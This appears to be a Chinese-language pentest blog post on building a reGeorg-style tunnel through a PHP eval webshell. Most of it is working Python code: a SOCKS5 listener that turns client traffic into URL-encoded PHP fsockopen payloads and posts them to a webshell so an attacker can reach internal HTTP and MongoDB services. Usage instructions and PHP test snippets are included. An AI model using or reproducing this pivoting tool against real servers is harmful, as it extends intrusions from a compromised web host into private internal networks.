Title: PHP Eval Proxy
Category: Pentest
Slug: php-eval-proxy
Date: 2019-10-23


背景: linux，php环境下的reGeorg不可用。
目标: 分析reGeorg的原理尝试改一下
结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis

```
Protocols that are suitable to smuggle
  HTTP based protocol:
    Elastic, CouchDB, Mongodb, Docker

  Text-based protocol:
    FTP, SMTP, Redis, Memcached
```



###尝试1

这个脚本是个残的:

```
#coding: utf-8
import socket
import binascii
import requests


headers = {
"Host": "",
"Accept-Encoding": "gzip, deflate",
"User-Agent": "Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Firefox/1.0 (Ubuntu package 1.0.2)",
"Content-Type": "application/x-www-form-urlencoded",
"Connection": "close"
}

url = "http://127.0.0.1/eval.php"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("127.0.0.1",8889))
s.listen(5)
sock, addr_info = s.accept()

while True:
    print 'Connect by ', addr_info
    data = sock.recv(102400)
    payload = 'pass=%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22' + hex2bin(data) + "%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B'timed_out'%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20'false%20lala'%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B"
    print payload
    data2 = requests.post(url=url,headers=headers,data=payload,proxies={"http":"http://127.0.0.1:8080"},timeout=30).content
    print data2
    print "sending data"
    sock.send(data2)
```
 
**hex2bin is available with PHP Version >= 5.4.0**

绑定本机的8889端口，然后mongo直接连,`mongo --port 8889`,如果想观察之间的流量可以这样做:
 
 ```
 python mongo_proxy  //监听8889
 socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 //流量肉眼可以看
 mongo --port 8888  //连接8888
 ```
 
发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的`子集`，因为如果要访问端口之类的就需要改脚本了。

看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:

```
Connect: 连接之后生成一个cookie

Forward: 把要请求的数据包放在cookie里面的writebuf

Read: Regeorg的脚本读取writbuf的数据包之后请求接口服务，比如curl访问内网端口。然后把结果写入到cookie里面的readbuf，读取readbuf的内容

Disconnect: 把cookie里面的run标志变为false，cookie就不再使用了。
```

所以当Regeorg不能使用的时候，比如第一步的connect无法生成。
上面脚本的过程是这样子的: 我看了看regeorg的源代码，百思不得其解为什么connect没生成，调试了几天没结果。（好菜.jpg)，这个时候我发现regeorg的php原理基本就是上面的步骤。所以我就手动写脚本尝试可行。

有一个不知道是什么坑的问题: 当我把ip作为变量发送到远程服务器的时候，远程服务器会出现epool_wait的错误。但是当整个脚本放在远程服务器的时候就可以运行了。

```
失败:

<?php
$ip = $_POST['ip'];
$port = $_POST['port'];
$com = $_POST['command'];
$payload = $com.'\r\n';
$res = fsockopen($ip,(int)$port,$errno, $errstr);
//$res = stream_socket_client("tcp://127.0.0.1:6379", $errno, $errstr);
var_dump($res);
stream_set_timeout(1);
stream_set_blocking(false);
fwrite($res,$raw);
while ($o=fgets($res,5)){
$readbuf .= $o;
}
var_dump($readbuf);

fclose($res);
```

```
成功:

<?php
$res = fsockopen("127.0.0.1",6379);
$raw = "info\r\n";
stream_set_timeout($res,1);
stream_set_blocking(false);
fwrite($res,$raw);
$info = stream_get_meta_data($res);
echo $info['timed_out'];
while ($o =fgets($res,5)){
        if($o === false){echo 'false lala';}
$readBuff .= $o;
}
var_dump($readBuff);
```

所以我到了现在这一步，其实是中间发现antsword的扫描端口原理，就是包装好数据包发送到远程服务器，远程服务器做一个eval。

既然是eval了，那么就是跟xss一个原理: 你有了一个"编辑器"。

所以呢，再看看前面的regeorg的原理，剩下最后一步了，改造上面的脚本，让他适合proxychains。

###尝试2


```
# coding: utf-8
import socket
import binascii
import urllib
import sys
import requests

VER = "\x05"
METHOD = "\x00"
SUCCESS = "\x00"
SOCKFAIL = "\x01"
NETWORKFAIL = "\x02"
HOSTFAIL = "\x04"
REFUSED = "\x05"
TTLEXPIRED = "\x06"
UNSUPPORTCMD = "\x07"
ADDRTYPEUNSPPORT = "\x08"
UNASSIGNED = "\x09"



def parseSocks5(sock):

    nmethods, methods = (sock.recv(1), sock.recv(1))
    # print nmethods,methods
    sock.sendall(VER + METHOD)
    ver = binascii.b2a_hex(sock.recv(1))
    # print "ver:%s " % ver  #socks version: socks5 or socks4

    if ver == "\x02":  # this is a hack for proxychains
        ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1))
    else:
        cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1))
    target = None
    targetPort = None

    if atyp == "\x01":  # IPv4
                # Reading 6 bytes for the IP and Port
        target = sock.recv(4)
        targetPort = sock.recv(2)
        target = "." .join([str(ord(i)) for i in target])
    elif atyp == "\x03":  # Hostname
        targetLen = ord(sock.recv(1))  # hostname length (1 byte)
        target = sock.recv(targetLen)
        targetPort = sock.recv(2)
        target = "".join([unichr(ord(i)) for i in target])
    elif atyp == "\x04":  # IPv6
        target = sock.recv(16)
        targetPort = sock.recv(2)
        tmp_addr = []
        for i in xrange(len(target) / 2):
            tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1])))
        target = ":".join(tmp_addr)
    targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1])
    # print targetPort
    # print target

    if cmd == "\x02":  # BIND
        raise SocksCmdNotImplemented("Socks5 - BIND not implemented")
    elif cmd == "\x03":  # UDP
        raise SocksCmdNotImplemented("Socks5 - UDP not implemented")
    elif cmd == "\x01":  # CONNECT
        serverIp = target
        serverIp = "".join([chr(int(i)) for i in serverIp.split(".")])

    sock.sendall(VER + SUCCESS + "\x00" + "\x01" + serverIp + chr(targetPort / 256) + chr(targetPort % 256))
    # print "recv: %s" % binascii.b2a_hex(sock.recv(1024))
    return target,targetPort


def sendPayload(sock,flag=''):
    print "[Prepare Payload]"
    try:
        data = sock.recv(20480)
    except:
        print "Closing Proxy"
        s.close()
        exit(0)

    if data:
        print "<< Recving Data From Client"
        tmp_payload = "$res = fsockopen('%s',%s);" % (target, targetPort)
        tmp_payload += "$raw = hex2bin('" + binascii.b2a_hex(flag+data) + "');"
        tmp_payload += "stream_set_timeout($res,1);"
        # tmp_payload += "stream_set_blocking(true);"
        tmp_payload += "fwrite($res,$raw);"
        tmp_payload += "while ($o =fgets($res,100)){if($o === false){echo 'Connect Failed';}"
        tmp_payload += "$readBuff .= $o;}"
        tmp_payload += "echo $readBuff;"
        tmp_payload += "fclose($res);"
        # print tmp_payload
        payload = urllib.quote(tmp_payload)
        # print "The payload is: %s" %payload
        shell = sys.argv[1]
        p = sys.argv[2]
        exp = "%s=%s" % (p, payload)
        content = requests.post(shell, data=exp, proxies={"http": "http://127.0.0.1:8080"},
                                headers={"Content-Type": "application/x-www-form-urlencoded"}).content
        sock.send(content)
        print ">> Sending Data to Client"
        flag2 = sock.recv(1)
        while flag2:
            sendPayload(sock,flag2)
        # else:
        #     s.close()
        #     exit(0)
        # # s.close()
    else:
        pass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 2)
s.bind(("127.0.0.1", 9999))
s.listen(5)


while 1:
    try:
        sock, addr_info = s.accept()
        print "[Accept Bytes]"
        flag = sock.recv(1)

        if flag == "\x05":
            target, targetPort = parseSocks5(sock)
            sendPayload(sock)
        else:
            sendPayload(sock,flag)
    except KeyboardInterrupt:
        exit(0)
```

使用方法: `python rego.py <webshell> <webshell's pass>` 

这个很烂的单线程代码实现了这样的功能:

1. 开启一个本地的9999的socks5代理
2. 使用这个代理可以用curl访问内网web服务
3. 可以访问这些数据库，mongo可用
4. 使用了8080作为代理，放在burp里面看流量


有这样的缺点:

1. curl访问web和访问mongo只能选一个(比如开了两个窗口，一个访问http，一个访问mongo)
2. 速度很慢，取决于实际环境，自己调timeout
3. ssh或者mysql不能用，因为没有保持socks连接。

为什么reGeorg就可以？因为reGeorg用`while true`循环保持了socks连接，通过写入cookie的数据进行交互。


测试主要使用了socat转发流量:

```
socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889

```

###END

测试了下redis不可用，因为默认redis使用的是RESP的协议。